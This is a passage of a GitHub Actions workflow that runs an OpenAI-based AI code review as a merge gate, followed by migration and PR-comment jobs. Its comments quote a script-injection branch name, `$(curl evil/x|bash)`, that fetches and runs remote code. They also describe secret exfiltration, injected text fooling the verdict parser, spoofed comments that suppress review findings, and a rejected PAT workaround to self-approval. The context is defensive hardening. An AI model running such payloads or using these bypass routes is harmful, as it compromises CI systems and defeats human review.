  # Second, independent agent in the two-step "one writes, one reviews"
  # setup: the jobs above are the implementer's work (whether that's a
  # human, Claude Code interactively, or Dependabot); this is a separate,
  # stateless ChatGPT (OpenAI) call that reviews the diff and either
  # approves or requests changes as a real PR review — not just a comment.
  # A real "Changes requested" review leaves `required_pull_request_reviews`
  # unsatisfied, so this is a genuine merge gate, not advisory.
  #
  # Deliberately a different vendor from the implementer, not just a
  # different session of the same model — ai-failure-analysis above and the
  # implementer (Claude Code) are both Anthropic; this job is OpenAI. Actual
  # cross-vendor independence, not just a fresh context window: no shared
  # training data, no shared RLHF blind spots, no shared susceptibility to
  # the same framing of an injected instruction.
  #
  # Deliberately only runs when nothing upstream has already failed — a
  # failing required check already blocks merge on its own, so this job
  # never has the chance to "approve past" a real failure; the one thing it
  # can get wrong is judging the *code*, not contradicting a known-failed
  # check. See scripts/ai-code-review.mjs for how hallucination/context-
  # leaking risk is handled: no commit messages or PR description are
  # passed in (only the raw diff + raw CI results), every claim has to cite
  # actual diff/log content, and the "Post review verdict" step below fails
  # closed (REQUEST_CHANGES) on anything that isn't a clean, verifiable
  # APPROVE — API errors, malformed output, or a "files reviewed" list that
  # doesn't match the real diff all count as untrusted.
  #
  # Admin-bypass (`gh pr merge --admin`) still technically overrides this,
  # same as it overrides the review requirement generally — don't use it to
  # route around a REQUEST_CHANGES verdict without actually addressing what
  # it flagged, for the same reason this repo doesn't admin-bypass a
  # failing Lighthouse check.
  #
  # Accepted risk, deliberately not engineered around: this job runs on
  # `pull_request`, which executes the workflow file *from the PR branch
  # itself* (unlike `pull_request_target`), and uses secrets.OPENAI_API_KEY.
  # A same-repo branch that edited this job could exfiltrate that key before
  # the verdict step ever runs. Not new to this job — ai-failure-analysis
  # above has carried the identical exposure (for secrets.ANTHROPIC_API_KEY)
  # since it was added. Left as-is because: this repo has no external fork
  # contributors (GitHub already withholds secrets from fork PRs on
  # `pull_request` specifically, so that path isn't the risk); every branch
  # that could exploit this already requires push access to this repo, at
  # which point far more direct paths to the same secret already exist.
  # Revisit (e.g. an Environment with required-reviewer protection on the
  # secret) if this repo ever takes external contributions.
  #
  # The reviewer also judges the path filter's skip decisions for this
  # specific diff (see the "This repo path-filters CI" paragraph in
  # ai-code-review.mjs's prompt) and can name skipped jobs it believes
  # should actually run — a static glob-based filter can miss genuine
  # cross-boundary effects the way docker-scan/docker-smoke's Dockerfile
  # gotcha already shows is possible (see the `changes` job's comment).
  # Structurally can't cause a skip that was CORRECT to become a problem —
  # forcing an unnecessary job to run just costs some CI time, nothing
  # more, so this doesn't need the same paranoid cross-checking as the
  # approve/reject verdict. Real guardrails that do exist: the model may
  # only ever name job IDs from a fixed whitelist (enforced twice — once
  # in the prompt, once again by exact-match filtering in
  # extractForceRunJobs, since a value only being *requested* isn't the
  # same as it being *safe to trust*); the list is never interpolated
  # into a shell command directly, only passed through `gh workflow run`'s
  # own `-f` flag; and because GitHub Actions has no way to change a
  # job's `if:` mid-run, "force-running" a job means starting a genuinely
  # separate `workflow_dispatch` run — it cannot retroactively resurrect
  # the job that was actually skipped in the current run.
  ai-code-review:
    name: AI code review
    runs-on: ubuntu-latest
    # Checks both failure and cancelled, not just failure — a cancelled
    # upstream job means its result is genuinely unknown (tests never
    # finished, not "tests passed"), so it shouldn't be reviewed as if
    # everything upstream actually completed.
    if: |
      always() &&
      github.event_name == 'pull_request' &&
      !contains(needs.*.result, 'failure') &&
      !contains(needs.*.result, 'cancelled')
    needs:
      [
        lint,
        test-ci-scripts,
        audit,
        test-api-unit,
        test-api-e2e,
        test-web,
        docker-scan,
        docker-smoke,
        perf-budget,
        load-test,
        test-e2e-web,
      ]
    permissions:
      contents: read
      pull-requests: write
      # Only for the "Force-run skipped CI jobs" step's `gh workflow run`
      # call — a workflow_dispatch trigger requires actions: write.
      actions: write
    steps:
      - uses: actions/checkout@v7

      - name: Fetch PR diff and job results
        env:
          GH_TOKEN: ${{ github.token }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          gh pr diff "$PR_NUMBER" > /tmp/pr-diff.txt

          cat > /tmp/job-summary.json << 'EOF'
          {
            "lint": "${{ needs.lint.result }}",
            "test-ci-scripts": "${{ needs.test-ci-scripts.result }}",
            "audit": "${{ needs.audit.result }}",
            "test-api-unit": "${{ needs.test-api-unit.result }}",
            "test-api-e2e": "${{ needs.test-api-e2e.result }}",
            "test-web": "${{ needs.test-web.result }}",
            "docker-scan": "${{ needs.docker-scan.result }}",
            "docker-smoke": "${{ needs.docker-smoke.result }}",
            "perf-budget": "${{ needs.perf-budget.result }}",
            "load-test": "${{ needs.load-test.result }}",
            "test-e2e-web": "${{ needs.test-e2e-web.result }}"
          }
          EOF

      # Grepped summary lines, not full logs — enough for the reviewer to
      # ground a "does test coverage look proportionate" judgment in real
      # text, without a prompt-sized dump of install/build noise. Same raw
      # per-job log endpoint as ai-failure-analysis (not `gh run view`,
      # which gates on the whole run completing).
      - name: Fetch test summary log excerpts
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          : > /tmp/test-summaries.txt
          job_ids=$(gh api "repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/jobs" --paginate --jq '.jobs[] | select(.name == "API unit tests" or .name == "API e2e tests" or .name == "Web build + tests" or .name == "Web e2e (Playwright)") | .id')
          for job_id in $job_ids; do
            echo "=== Job $job_id ===" >> /tmp/test-summaries.txt
            gh api --allow-escape-sequences "repos/${{ github.repository }}/actions/jobs/$job_id/logs" 2>/dev/null | grep -E "Test Files|Tests |Suites:|Tests:|passed|failed|coverage" >> /tmp/test-summaries.txt || true
          done

      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile

      # Lets the reviewer avoid re-flagging a finding I've already fixed or
      # explicitly disputed earlier in this same PR's thread, instead of
      # relying purely on a human noticing the repeat across rounds — see
      # CLAUDE.md's "AI code review gate" section. Only a comment from an
      # authorized login counts as a real override-decision record, not
      # just the marker string — this is a public-thread trust boundary,
      # not a formatting convention, since anyone who can comment on a
      # public PR could otherwise post a fake "already discussed and
      # dismissed" comment to try to suppress a real finding.
      - name: Fetch prior override decisions
        env:
          GH_TOKEN: ${{ github.token }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          # --slurp, not --jq: gh api --paginate --jq runs the filter once
          # PER PAGE, so a PR with enough comments to paginate would
          # produce several JSON arrays concatenated back-to-back instead
          # of one valid JSON value here — silently breaking this feature
          # on long threads (JSON.parse throwing, caught by the script's
          # own fail-closed default, so it wouldn't even show up as an
          # error). --slurp wraps every page into one outer array instead,
          # but the gh CLI rejects combining --slurp with --jq outright —
          # so this fetches raw pages and scripts/parse-override-decisions
          # .mjs does the flattening in JS via flattenPaginatedComments,
          # where it's covered by a real multi-page test case.
          #
          # set +e and an explicit empty-array fallback, not
          # continue-on-error: a live review caught that without either,
          # a transient gh api failure (rate limit, permissions blip)
          # would fail this step outright, and GitHub Actions skips every
          # subsequent step by default on a step failure — silently
          # preventing "Review with ChatGPT" from ever running at all,
          # not just from getting override context. This is optional
          # context for an otherwise-independent review, so its own
          # fetch failing must never take the review down with it.
          set +e
          gh api "repos/${{ github.repository }}/issues/$PR_NUMBER/comments" --paginate --slurp \
            > /tmp/pr-comments-raw.json
          if [ ! -s /tmp/pr-comments-raw.json ]; then
            echo "gh api call for PR comments failed or returned nothing — defaulting to no override context." >&2
            echo "[]" > /tmp/pr-comments-raw.json
          fi
          node scripts/parse-override-decisions.mjs /tmp/pr-comments-raw.json "${{ github.repository_owner }}" \
            > /tmp/override-decisions.json

      # continue-on-error so an OpenAI API failure (rate limit, timeout,
      # malformed response) still lets the next step run and fail closed,
      # instead of silently leaving the PR with zero reviews.
      - name: Review with ChatGPT
        id: review
        continue-on-error: true
        env:
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
        run: node scripts/ai-code-review.mjs /tmp/pr-diff.txt /tmp/job-summary.json /tmp/test-summaries.txt /tmp/diff-truncated.txt /tmp/override-decisions.json > /tmp/review.md

      # Runs the same tests that back scripts/lib/review-verdict.mjs
      # (scripts/lib/review-verdict.test.mjs) as an actual CI gate, not
      # just something run by hand — a regression here fails this step,
      # and "Post review verdict" below (if: always()) still posts a
      # fail-closed REQUEST_CHANGES rather than silently leaving zero
      # reviews. The parsing logic that decides APPROVE vs REQUEST_CHANGES
      # went through three real bugs across successive live reviews
      # (first-occurrence matching fooled by injected text, `tr -d`
      # collapsing internal whitespace so a malformed verdict matched
      # anyway, and a `set -e`-triggered silent abort on zero matches) —
      # this is what actually closes that gap, versus re-discovering the
      # same class of bug by hand again later.
      - name: Test review-verdict parsing
        run: node --test scripts/lib/review-verdict.test.mjs

      - name: Test override-decision parsing
        run: node --test scripts/lib/override-decisions.test.mjs

      - name: Post review verdict
        if: always()
        env:
          GH_TOKEN: ${{ github.token }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          # This step's entire job is to always eventually reach the final
          # `gh pr review` call below — never to abort partway through.
          # GitHub Actions' default bash runs with `set -e`, and this step
          # already hit that exact failure mode once (a zero-match `grep -c`
          # silently aborted before REQUEST_CHANGES was ever posted).
          # Patching each risky command individually (`|| true`) is fragile
          # — `set +e` here instead makes it structural: nothing in this
          # step can abort it early, only the explicit checks below decide
          # the outcome. Verified locally with a deliberately failing
          # command mid-step under both settings before landing this.
          set +e
          verdict="REQUEST_CHANGES"

          if [ "${{ steps.review.outcome }}" = "success" ] && [ -s /tmp/review.md ]; then
            # scripts/lib/review-verdict.mjs has the actual decision logic
            # (and its own test suite, run above) — this step just gathers
            # its two inputs and trusts its stdout verbatim.
            gh pr diff "$PR_NUMBER" --name-only > /tmp/actual-files.txt
            verdict=$(node scripts/parse-review-verdict.mjs /tmp/review.md /tmp/actual-files.txt /tmp/diff-truncated.txt)
          else
            echo "Automated review did not complete — flagging for human review." > /tmp/review.md
          fi

          {
            echo "### 🤖 AI code review (ChatGPT · GPT-5.6)"
            echo
            cat /tmp/review.md
            echo
            echo "_Automated review — verify before trusting it, especially a REQUEST_CHANGES verdict on something it may have misread._"
          } > /tmp/review-comment.md

          # GitHub blocks the default GITHUB_TOKEN from ever posting an
          # APPROVE review — a deliberate platform restriction (a workflow
          # self-approving a PR would defeat required_pull_request_reviews
          # entirely), not a permissions/scopes gap this repo controls.
          # Discovered live: PR #20 was the first real APPROVE verdict this
          # job ever produced, and the job crashed on
          # "GitHub Actions is not permitted to approve pull requests."
          #
          # The first fix attempt here used a PR_REVIEW_PAT (a real
          # account's token) via an inline GH_TOKEN override to post the
          # approval instead. A live review of that attempt (PR #36) caught
          # why it was wrong, not just a workaround: GitHub's restriction
          # exists specifically so an automated verdict can never satisfy
          # required_pull_request_reviews on its own — swapping in a real
          # human account's PAT doesn't route around that restriction so
          # much as defeat its actual purpose, since branch protection
          # can't distinguish "the account holder reviewed this" from "a
          # workflow posted this using the account holder's credentials."
          # There's also no GitHub feature for an identity whose approval
          # is deliberately excluded from the count — any approving review
          # from a collaborator with write access satisfies the gate.
          #
          # So: REQUEST_CHANGES keeps posting as a real review (blocking is
          # fine — it only ever adds friction, never satisfies anything).
          # APPROVE never does, regardless of any secret being configured —
          # it always degrades to a plain comment. The human is the one who
          # decides a green, AI-approved PR is ready, via the same
          # admin-bypass this repo already uses deliberately and visibly
          # for its one-contributor review gate (see "The one hard rule"
          # above) — not something a credential can quietly stand in for.
          if [ "$verdict" = "APPROVE" ]; then
            gh pr comment "$PR_NUMBER" --body-file /tmp/review-comment.md
          else
            gh pr review "$PR_NUMBER" --request-changes --body-file /tmp/review-comment.md
          fi

      # GitHub Actions has no way to change a job's `if:` mid-run, so
      # "force-running" a skipped job means starting a genuinely separate
      # workflow_dispatch run on this same branch — it can't resurrect the
      # job that was actually skipped in the run this step is part of.
      # Gated on steps.review.outcome specifically (not just always()):
      # if the review itself never completed, there's no trustworthy
      # review.md to read a force-run list from.
      #
      # Untestable pre-merge, structurally: GitHub only recognizes
      # workflow_dispatch as a valid trigger for a workflow file once that
      # trigger exists on the *default branch* — until this PR merges,
      # `gh workflow run` below will fail (`set +e` catches it, logs it,
      # doesn't fail this job) rather than actually dispatch anything, even
      # on this PR's own branch. Verified everything else that can be
      # verified pre-merge (unit tests on the parsing, YAML validity,
      # dry-run of the command's own syntax) — the live dispatch call
      # itself is the one piece that can only be confirmed working after
      # this lands on main.
      - name: Force-run skipped CI jobs if the reviewer disagrees
        if: always() && steps.review.outcome == 'success'
        env:
          GH_TOKEN: ${{ github.token }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          # Passed via env, not interpolated directly into the run: script
          # below, deliberately -- github.event.pull_request.head.ref is a
          # PR author-controlled branch name, and GitHub substitutes `${{
          # }}` expressions as literal text BEFORE the shell parses the
          # script. A branch named e.g. `$(curl evil/x|bash)` would, if
          # interpolated directly, become real shell command substitution
          # in the runner's context -- a live AI review round on this
          # exact PR caught this (this repo's own official GitHub Actions
          # script-injection example). Referencing it as "$HEAD_REF"
          # instead means its contents go through ordinary parameter
          # expansion, never re-parsed as shell syntax, regardless of what
          # characters it contains.
          HEAD_REF: ${{ github.event.pull_request.head.ref }}
        run: |
          set +e
          force_jobs=$(node scripts/parse-force-run-jobs.mjs /tmp/review.md)

          if [ -n "$force_jobs" ]; then
            echo "Reviewer disagrees with CI skip logic — force-running: $force_jobs"

            # `gh workflow run` prints the created run's URL to stdout on
            # success ("The created workflow run URL will be returned if
            # available" per `gh workflow run --help") -- captured here so
            # the PR comment can link directly to it instead of just
            # pointing at the Actions tab and making the reader hunt for
            # the right run. Verified this is really stdout, not stderr,
            # by running it for real with the streams split.
            run_url=$(gh workflow run ci.yml --ref "$HEAD_REF" -f force_jobs="$force_jobs" 2>/tmp/force-run-error.txt)
            dispatch_exit=$?

            # Three distinct outcomes, not two -- a live review round
            # caught that collapsing "exit 0, empty URL" into the same
            # branch as a genuine dispatch failure is itself wrong: `gh`'s
            # own docs say the URL is returned "if available", meaning a
            # real success with no URL is an expected, non-error case. The
            # first version of this fix treated that case as a failure and
            # told the reader to manually re-dispatch -- which, since the
            # original dispatch actually succeeded, would create a real
            # duplicate run instead of just being unhelpful.
            if [ $dispatch_exit -ne 0 ]; then
              dispatch_error=$(cat /tmp/force-run-error.txt)
              echo "gh workflow run failed (exit $dispatch_exit): $dispatch_error"
              # Deliberately does NOT display a literal `gh workflow run
              # --ref $HEAD_REF ...` command here, even though embedding it
              # in this bash string is itself safe (no shell re-execution
              # happens building a --body string). The risk is downstream:
              # HEAD_REF is a PR-author-controlled branch name, and this
              # would render it in the PR comment as a "copy this and run
              # it" shell snippet -- if a maintainer copy-pastes it into
              # their own terminal trusting the suggestion, THEIR shell
              # would parse whatever the branch name contains, e.g. a
              # crafted $(curl evil/x|bash). A live review round caught
              # this as a distinct risk from the runner-side interpolation
              # fixed above (env: HEAD_REF protects the runner; it does
              # nothing for text a human later copies out of this comment
              # and pastes into their own shell). Pointing at the Actions
              # UI instead sidesteps it entirely -- the branch there comes
              # from GitHub's own picker, never copy-pasted text.
              gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`, but triggering it automatically failed (a dispatch error, not a job failure -- see this job's own log for details). To trigger it by hand: open the Actions tab, select the CI workflow, click \"Run workflow\", pick this PR's branch from the dropdown, and set \`force_jobs\` to \`$force_jobs\`. Don't copy a branch name out of a PR comment into a shell command -- it isn't sanitized for that."
            elif [ -n "$run_url" ]; then
              gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`. Triggered run: $run_url — runs independently of this PR's normal required checks, since GitHub Actions can't retroactively un-skip a job in the run already in progress."
            else
              echo "gh workflow run succeeded but returned no URL — dispatch itself worked, just nothing to link"
              gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`. A run was triggered successfully, but its URL wasn't available right away — check the Actions tab on the \`$HEAD_REF\` branch for its progress."
            fi
          else
            echo "Reviewer agrees with all skip decisions — nothing to force-run."
          fi

  migrate:
    name: Apply prod DB migrations
    runs-on: ubuntu-latest
    # Only the prod image's own container can reach the app at runtime, but
    # the prod image deliberately has no prisma CLI (see apps/api/Dockerfile
    # — `pnpm deploy --prod` drops devDependencies) and Render's Free-tier
    # Pre-Deploy Command is locked. So migrations run here instead, against
    # the External DB URL, gated behind every other check on main only —
    # this job is itself a required check, so Render's "After CI Checks
    # Pass" auto-deploy waits for the schema to land before the new code
    # that depends on it goes live.
    #
    # Explicit needs.*.result check, not the plain ref/event check this
    # used to be — audit/test-api-unit/test-api-e2e/test-web can now be
    # genuinely SKIPPED on this same push (path filtering, see the
    # `changes` job), and a skip here must not block deploy: the merge
    # that produced this push already required those checks to report
    # *something* (skipped counts) before GitHub allowed it. Only a real
    # failure or cancellation should stop migrations from applying.
    # `always()` forces this job's own `if:` to actually be evaluated
    # regardless of upstream outcomes, for the same reason as
    # ai-failure-analysis below.
    #
    # `changes` itself is in this list — deliberately, unlike the jobs
    # above that only need it transitively — so its own "Verify the path
    # filter actually ran" self-check failing blocks deploy through this
    # same `!contains(needs.*.result, 'failure')` gate, not just show a
    # red job nobody's watching. Without this, `changes` failing would
    # cascade the *other* jobs in this list to `skipped` (a job whose own
    # `needs:` dependency failed doesn't run), and `skipped` already
    # passes this gate by design — so the one failure that actually
    # matters here would have been silently absorbed by the same
    # skip-tolerance this gate needs for path-filtered jobs.
    if: |
      always() &&
      github.ref == 'refs/heads/main' && github.event_name == 'push' &&
      !contains(needs.*.result, 'failure') &&
      !contains(needs.*.result, 'cancelled')
    needs:
      [
        changes,
        lint,
        test-ci-scripts,
        audit,
        test-api-unit,
        test-api-e2e,
        test-web,
        docker-scan,
        docker-smoke,
      ]
    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version: 22
          cache: pnpm
      - run: pnpm install --frozen-lockfile

      - name: Apply prod DB migrations
        working-directory: apps/api
        run: pnpm exec prisma migrate deploy
        env:
          DATABASE_URL: ${{ secrets.PROD_DATABASE_URL }}

  comment-ci-result-on-pr:
    name: Comment CI result on the merged PR
    runs-on: ubuntu-latest
    # Closes a real gap hit live in this repo: squash-merging creates a
    # brand-new commit, and `push` fires an entirely separate CI run for
    # it -- a genuinely different result, not a redisplay of the PR's own
    # run (see the git workflow section's step 6 above; a PR passed clean
    # while the very next push-to-main run on the identical squash-merged
    # commit failed, on 2026-08-17). The closed PR's own Checks tab only
    # ever shows the pull_request-triggered runs from while it was open,
    # never this one -- so without this job, finding out this run even
    # exists means already knowing to check the Actions tab separately.
    #
    # always() so this reports a real failure too, not just successes --
    # arguably more valuable in the failure case: it's exactly the
    # situation that took manual digging to explain earlier the same day
    # this job was written.
    if: |
      always() &&
      github.event_name == 'push' && github.ref == 'refs/heads/main'
    needs:
      [
        changes,
        lint,
        test-ci-scripts,
        audit,
        test-api-unit,
        test-api-e2e,
        test-web,
        docker-scan,
        docker-smoke,
        perf-budget,
        load-test,
        test-e2e-web,
        migrate,
      ]
    permissions:
      contents: read
      pull-requests: write
    steps:
      - name: Find originating PR and post CI result
        env:
          GH_TOKEN: ${{ github.token }}
          HAS_FAILURE: ${{ contains(needs.*.result, 'failure') }}
          HAS_CANCELLED: ${{ contains(needs.*.result, 'cancelled') }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
          JOB_RESULTS: ${{ toJSON(needs) }}
        run: |
          set +e

          # A commit can have zero associated PRs (a direct admin push,
          # bypassing the normal branch-off-main flow this repo otherwise
          # always uses) -- not an error, just nothing to comment on.
          # Verified this endpoint and both the populated and empty-array
          # cases directly against real commits before relying on it.
          pr_number=$(gh api "repos/${{ github.repository }}/commits/${{ github.sha }}/pulls" --jq '.[0].number' 2>/tmp/pr-lookup-error.txt)
          lookup_exit=$?
          if [ $lookup_exit -ne 0 ]; then
            echo "PR lookup failed: $(cat /tmp/pr-lookup-error.txt)"
            exit 0
          fi
          if [ -z "$pr_number" ] || [ "$pr_number" = "null" ]; then
            echo "No PR associated with this commit -- nothing to comment on."
            exit 0
          fi

          if [ "$HAS_FAILURE" = "true" ]; then
            status_line="❌ **One or more checks failed** on the push-to-main run for this merge."
          elif [ "$HAS_CANCELLED" = "true" ]; then
            status_line="⚠️ One or more checks were **cancelled** on the push-to-main run for this merge."
          else
            status_line="✅ All checks passed on the push-to-main run for this merge."
          fi

          # jq, not node -- this job never runs actions/setup-node, so a
          # bare `node` call would depend on an unverified assumption
          # about the runner image; jq is already relied on extensively
          # throughout this workflow and is part of the standard
          # ubuntu-latest image. codeql.yml's own job isn't in this list --
          # it's a separate workflow file, not reachable via this
          # workflow's own `needs` context.
          job_table=$(echo "$JOB_RESULTS" | jq -r 'to_entries | map("| \(.key) | \(.value.result) |") | join("\n")')

          body=$(printf '%s\n\n%s\n\n| Job | Result |\n|---|---|\n%s\n\nRun: %s' \
            "$status_line" \
            "This is the CI run for the actual merge commit on \`main\` — separate from this PR's own checks, which only ever covered the pre-merge branch. See CLAUDE.md's git workflow section for why these can differ." \
            "$job_table" \
            "$RUN_URL")

          # --repo required: this job never runs actions/checkout (it
          # doesn't need the repo's code, only gh CLI context), so there's
          # no local git remote for `gh pr comment` to infer a repository
          # from -- the same already-documented gotcha as pr-
          # reconciliation.yml's own comment calls, missed here on the
          # first pass despite reading that exact precedent while writing
          # this job. A live review round caught it: on a fresh runner
          # with no repo context, this would have failed as the script's
          # last command, and since it's the last command, `set +e`
          # doesn't turn that failure into success -- the step itself
          # would show red, just not for the reason anyone reading the
          # log would expect.
          gh pr comment "$pr_number" --repo "${{ github.repository }}" --body "$body"
